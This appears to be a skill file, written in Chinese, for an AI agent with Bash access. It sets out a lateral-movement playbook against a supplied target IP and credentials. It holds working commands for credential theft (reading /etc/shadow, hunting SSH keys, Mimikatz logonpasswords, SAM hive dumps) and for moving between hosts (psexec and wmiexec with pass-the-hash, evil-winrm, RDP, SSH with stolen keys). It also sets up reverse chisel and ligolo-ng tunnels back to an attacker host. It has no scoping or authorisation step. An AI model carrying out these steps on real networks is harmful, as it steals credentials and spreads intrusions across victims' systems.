---
name: lateral-movement
description: 横向移动方法论（psexec/wmi/ssh pivot）
when_to_use: 当已获得一台主机权限需要横向移动到其他主机时
allowed-tools: [Bash, Read, Write]
argument-hint: "<target-ip> <credentials>"
arguments: [target]
user-invocable: true
context: inline
---

## 横向移动

### 1. 凭据收集（当前主机）

```bash
# Linux
cat /etc/shadow
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "id_rsa" 2>/dev/null
cat ~/.bash_history | grep -i "ssh\|pass\|key"

# Windows
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# SAM dump
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

### 2. Windows 横向移动

```bash
# PsExec（需要 admin 权限 + SMB 445）
impacket-psexec <domain>/<user>:<password>@$ARGUMENTS
impacket-psexec -hashes :<NTLM> <domain>/<user>@$ARGUMENTS

# WMI（需要 admin 权限 + WMI 135）
impacket-wmiexec <domain>/<user>:<password>@$ARGUMENTS

# WinRM（需要 5985/5986）
evil-winrm -i $ARGUMENTS -u <user> -p <password>
evil-winrm -i $ARGUMENTS -u <user> -H <NTLM_hash>

# RDP
xfreerdp /v:$ARGUMENTS /u:<user> /p:<password> /cert:ignore

# SMB 文件传输
smbclient //$ARGUMENTS/C$ -U '<domain>\<user>%<password>'
```

### 3. Linux 横向移动

```bash
# SSH 密钥
ssh -i stolen_key user@$ARGUMENTS

# SSH 密码
sshpass -p '<password>' ssh user@$ARGUMENTS

# SSH 隧道/端口转发
ssh -L <local_port>:<internal_target>:<target_port> user@$ARGUMENTS
ssh -D 1080 user@$ARGUMENTS  # SOCKS 代理
```

### 4. 网络隧道

```bash
# chisel（SOCKS 代理）
# 攻击机:
chisel server --reverse --port 8080
# 目标机:
chisel client <attacker>:8080 R:socks

# ligolo-ng
# 攻击机:
ligolo-proxy -selfcert
# 目标机:
ligolo-agent -connect <attacker>:11601 -ignore-cert

# SSH 动态转发
ssh -D 9050 user@pivot_host
proxychains nmap -sT <internal_target>
```

### 5. 决策树

```
已有凭据/哈希
  ├── Windows 目标
  │     ├── SMB 开放 → PsExec / Pass-the-Hash
  │     ├── WinRM 开放 → Evil-WinRM
  │     ├── WMI 可用 → WMIExec
  │     └── RDP 开放 → xfreerdp
  ├── Linux 目标
  │     ├── SSH 密钥 → 直接连接
  │     ├── SSH 密码 → sshpass
  │     └── 其他服务 → 利用已知凭据
  └── 需要穿透内网
        ├── SSH 隧道（最简单）
        ├── chisel SOCKS 代理
        └── ligolo-ng（最稳定）
```
